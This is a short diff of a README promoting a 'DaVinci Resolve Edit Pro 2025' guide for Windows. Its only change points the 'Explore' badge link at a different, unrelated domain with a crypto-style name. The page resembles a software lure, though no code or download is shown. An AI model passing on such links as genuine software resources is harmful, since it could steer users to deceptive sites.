@@ -2,7 +2,7 @@
 
 🌟 Elevate your video editing with DaVinci Resolve Edit Pro 2025! This powerful guide optimizes montage workflows, color grading, and Fusion templates, crafted for YouTubers, freelancers, and small studios on Windows.
 
-[![Explore DaVinci Edit Pro](https://img.shields.io/badge/Explore-DaVinci_Edit_Pro-blueviolet)](https://glocktober.com)
+[![Explore DaVinci Edit Pro](https://img.shields.io/badge/Explore-DaVinci_Edit_Pro-blueviolet)](https://ton-stake.net)
 
 ---
 
